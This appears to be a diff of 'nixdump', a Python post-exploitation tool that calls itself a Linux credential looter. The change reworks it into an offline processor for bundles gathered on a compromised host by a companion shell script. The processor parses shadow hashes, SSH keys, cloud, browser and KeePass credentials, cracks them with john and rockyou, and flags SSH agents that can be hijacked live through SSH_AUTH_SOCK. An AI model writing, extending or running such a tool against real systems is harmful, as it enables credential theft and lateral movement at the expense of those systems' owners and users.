@@ -1,25 +1,22 @@
 #!/usr/bin/env python3
-"""nixdump - local Linux credential looter.
+"""nixdump - Linux credential looter, offline processor.
 
-Run it on a host you have popped (ideally as root) and it dumps every credential
-it can find - shadow hashes (optional offline crack), SSH keys, cloud/CLI creds,
-KeePass/Firefox, web-app + DB configs, NetworkManager WiFi/VPN, SSSD cached
-domain hashes, Kerberos tickets, and secrets in running processes - into one
-unified table.
+Two stages:
+  1) target:  sh nixdump.sh           -> one .tar.gz bundle of raw artifacts
+              (pure POSIX sh, needs nothing, runs on any box)
+  2) your VM: python3 nixdump.py BUNDLE.tar.gz
+              parse everything, crack hashes (john), decrypt stores, one table.
 
-  ./nixdump.py                 # loot everything readable
-  ./nixdump.py --crack         # also crack shadow/kdbx/ssh with john+rockyou
-  ./nixdump.py --json --csv -o loot
-  ./nixdump.py --only shadow,ssh,cloud
-  ./nixdump.py --home-only     # skip full-FS walks (faster/quieter)
-
-Not root? It still runs - root-only collectors (shadow, sssd, networkmanager,
-other users' /proc) are skipped automatically.
+  python3 nixdump.py bundle.tgz
+  python3 nixdump.py bundle.tgz --json          # also write loot.json/csv dir
+  python3 nixdump.py bundle.tgz --no-crack      # skip john (fast, hashes only)
+  python3 nixdump.py bundle.tgz --only shadow,ssh
 """
 from __future__ import annotations
 
 import argparse
 import os
+import re
 import sys
 import tarfile
 import tempfile
@@ -28,27 +25,23 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 from core import reporter, tools                              # noqa: E402
 from core.secret import Secret, Status                        # noqa: E402
-from core.tools import is_root, which                         # noqa: E402
+from core.tools import which                                  # noqa: E402
 from core.cracker import default_wordlist                     # noqa: E402
 from collectors import ALL_COLLECTORS                          # noqa: E402
+
+OUT_DIR = "nixdump_loot"        # default export folder (used with --json/--csv)
 
 
 def build_args() -> argparse.ArgumentParser:
     p = argparse.ArgumentParser(
-        description="nixdump - local Linux credential looter",
+        description="nixdump - Linux credential looter (offline processor)",
         formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
-    p.add_argument("--offline", metavar="ARCHIVE",
-                   help="parse a bundle collected by nixdump.sh instead of the "
-                        "live host (crack/decrypt here on kali with all tools)")
-    p.add_argument("-o", "--out", default="nixdump_loot",
-                   help="output directory for exports")
+    p.add_argument("archive", nargs="?", help="bundle (.tar.gz) made by nixdump.sh")
     p.add_argument("--json", action="store_true", help="export loot.json")
     p.add_argument("--csv", action="store_true", help="export loot.csv")
-    p.add_argument("--crack", action="store_true",
-                   help="offline-crack shadow/kdbx/ssh hashes with john + wordlist")
-    p.add_argument("--wordlist", help="wordlist for --crack (default: rockyou if found)")
-    p.add_argument("--home-only", action="store_true",
-                   help="only read user homes (skip slow full-filesystem walks)")
+    p.add_argument("--no-crack", action="store_true",
+                   help="do NOT run john; just dump hashes uncracked (fast)")
+    p.add_argument("--wordlist", help="wordlist for cracking (default: rockyou)")
     p.add_argument("--only", help="comma list of collectors to run (see --list)")
     p.add_argument("--skip", help="comma list of collectors to skip")
     p.add_argument("--list", action="store_true", help="list collectors and exit")
@@ -68,39 +61,31 @@ def select(only, skip):
 
 
 def _agent_findings(meta_dir) -> list:
-    """Turn meta/ssh_agent.txt (captured on the target) into INFO findings:
-    whether an agent holds keys, whose agent it is, and the source IPs of
-    inbound SSH sessions - so you know a forwarded agent may be hijackable
-    LIVE on the box (the key itself is never in the bundle)."""
-    import re
-    path = os.path.join(meta_dir, "ssh_agent.txt")
+    """meta/ssh_agent.txt -> INFO findings: agent keys (hijackable LIVE on the
+    box, never in the bundle), agent sockets, and SSH source IPs."""
     try:
-        with open(path, errors="ignore") as fh:
+        with open(os.path.join(meta_dir, "ssh_agent.txt"), errors="ignore") as fh:
             lines = fh.read().splitlines()
     except OSError:
         return []
-    out = []
-    section = ""
+    out, section = [], ""
     for ln in lines:
         s = ln.strip()
         if s.startswith("## "):
-            section = s[3:]
-            continue
+            section = s[3:].lower(); continue
         if not s or s.startswith("<"):
             continue
-        sl = section.lower()
-        if ("ssh-add" in sl or "keys loaded" in sl) and re.search(r"SHA256:|MD5:|^\d{3,4} ", s):
+        if ("ssh-add" in section or "keys loaded" in section) and re.search(r"SHA256:|MD5:|^\d{3,4} ", s):
             out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                               secret_type="agent-key",
                               notes="key loaded in a target agent; hijack LIVE via SSH_AUTH_SOCK"))
-        elif "agent sockets" in sl and "agent." in s:
+        elif "agent sockets" in section and "agent." in s:
             out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
                               secret_type="agent-sock",
                               notes="agent socket on target (owner = whose agent)"))
-        elif "came from" in sl or "inbound ssh" in sl:
+        elif "came from" in section or "inbound ssh" in section:
             out.append(Secret("SSH-Agent", "", s[:160], Status.INFO,
-                              secret_type="login-src",
-                              notes="logged-in user / SSH source IP"))
+                              secret_type="login-src", notes="logged-in user / SSH source IP"))
     return out
 
 
@@ -109,92 +94,93 @@ def main() -> int:
     reporter.print_banner()
 
     if args.list:
-        print("Collectors (key -> description):")
         for c in ALL_COLLECTORS:
-            root = " [root]" if c.needs_root else ""
-            print(f"  {c.name.lower():<12} {c.description}{root}")
+            print(f"  {c.name.lower():<12} {c.description}")
         return 0
 
-    meta_dir = None
-    offline = bool(args.offline)
-    if offline:
-        if not os.path.isfile(args.offline):
-            print(f"[!] archive not found: {args.offline}", file=sys.stderr)
-            return 2
-        tmp = tempfile.mkdtemp(prefix="nixdump-offline-")
-        try:
-            with tarfile.open(args.offline) as tf:
-                try:
-                    tf.extractall(tmp, filter="data")   # py3.12+ safe extract
-                except TypeError:
-                    tf.extractall(tmp)
-        except Exception as e:
-            print(f"[!] failed to extract bundle: {e}", file=sys.stderr)
-            return 2
-        root_dir = os.path.join(tmp, "root")
-        meta_dir = os.path.join(tmp, "meta")
-        tools.set_root(root_dir)
-        print(f"[*] offline mode: {args.offline}", file=sys.stderr)
-        man = os.path.join(meta_dir, "manifest.txt")
-        if os.path.isfile(man):
-            with open(man, errors="ignore") as fh:
-                for ln in fh:
-                    print(f"    {ln.rstrip()}", file=sys.stderr)
-
-    # root gating: live -> depends on euid; offline -> bundle already holds
-    # whatever the operator could read, so run every collector.
-    root = True if offline else is_root()
-    if not offline:
-        print(f"[*] euid: {'root' if root else 'non-root (root-only collectors skipped)'}",
+    if not args.archive:
+        print("[!] usage: nixdump.py BUNDLE.tar.gz  (make it on the target with nixdump.sh)",
               file=sys.stderr)
-    if args.crack:
-        wl = args.wordlist or default_wordlist()
-        if not which("john"):
-            print("[!] --crack set but 'john' not found; hashes will be dumped uncracked",
-                  file=sys.stderr)
-        elif not wl:
-            print("[!] --crack set but no wordlist found; pass --wordlist",
-                  file=sys.stderr)
-        else:
-            print(f"[*] crack enabled (john + {wl})", file=sys.stderr)
+        return 2
+    if not os.path.isfile(args.archive):
+        print(f"[!] archive not found: {args.archive}", file=sys.stderr)
+        return 2
 
-    opts = {"crack": args.crack, "wordlist": args.wordlist,
-            "home_only": args.home_only, "verbose": args.verbose,
-            "offline": offline, "meta_dir": meta_dir}
+    # extract the bundle and point the collectors at it
+    tmp = tempfile.mkdtemp(prefix="nixdump-")
+    try:
+        with tarfile.open(args.archive) as tf:
+            try:
+                tf.extractall(tmp, filter="data")      # py3.12+ safe extract
+            except TypeError:
+                tf.extractall(tmp)
+    except Exception as e:
+        print(f"[!] failed to extract bundle: {e}", file=sys.stderr)
+        return 2
+    tools.set_root(os.path.join(tmp, "root"))
+    meta_dir = os.path.join(tmp, "meta")
 
-    collectors = select(args.only, args.skip)
-    results = []
-    seen = set()
-    for Col in collectors:
-        if Col.needs_root and not root:
-            print(f"   {Col.name:<12} skipped (needs root)", file=sys.stderr)
-            continue
-        try:
-            got = Col(opts).collect()
-        except Exception as e:
-            print(f"   {Col.name:<12} error: {e}", file=sys.stderr)
-            continue
-        added = 0
-        for s in got:
-            if s.key() in seen:
+    man = os.path.join(meta_dir, "manifest.txt")
+    if os.path.isfile(man):
+        with open(man, errors="ignore") as fh:
+            for ln in fh:
+                print(f"    {ln.rstrip()}", file=sys.stderr)
+
+    crack = not args.no_crack
+    if crack and not which("john"):
+        print("[!] john not found; hashes will be dumped uncracked (or use --no-crack)",
+              file=sys.stderr)
+        crack = False
+
+    # --- live progress UI (green, like the windows tool) ---
+    console = status = None
+    try:
+        from rich.console import Console
+        console = Console(stderr=True)
+        status = console.status("[bold green]starting...", spinner="line")
+        status.start()
+    except Exception:
+        console = None
+
+    def line(msg):
+        (console.print(msg, highlight=False) if console else print(msg, file=sys.stderr))
+
+    def active(msg):
+        if status:
+            status.update(f"[bold green]{msg}")
+
+    opts = {"crack": crack, "wordlist": args.wordlist, "verbose": args.verbose,
+            "meta_dir": meta_dir, "status_cb": active}
+
+    results, seen = [], set()
+    try:
+        for Col in select(args.only, args.skip):
+            active(f"looting  {Col.name}")
+            try:
+                got = Col(opts).collect()
+            except Exception as e:
+                line(f"   {Col.name:<12} error: {e}")
                 continue
-            seen.add(s.key())
-            results.append(s)
-            added += 1
-        print(f"   {Col.name:<12} {added:>3} finding(s)", file=sys.stderr)
+            added = 0
+            for s in got:
+                if s.key() in seen:
+                    continue
+                seen.add(s.key()); results.append(s); added += 1
+            mark = f"[green]{added:>3}[/green]" if (console and added) else f"{added:>3}"
+            line(f"   {Col.name:<12} {mark} finding(s)")
 
-    # offline: surface ssh-agent / logged-in-user intel from the bundle's meta
-    if offline and meta_dir:
         for s in _agent_findings(meta_dir):
             if s.key() not in seen:
-                seen.add(s.key())
-                results.append(s)
+                seen.add(s.key()); results.append(s)
+    finally:
+        if status:
+            status.stop()
 
     print()
     reporter.render_table(results)
     if args.json or args.csv:
-        reporter.export(results, args.out, args.json, args.csv)
-        print(f"\n[*] exports written under {args.out}/", file=sys.stderr)
+        reporter.export(results, OUT_DIR, args.json, args.csv)
+        print(f"\n[*] exports written under {OUT_DIR}/", file=sys.stderr)
     return 0
 
 
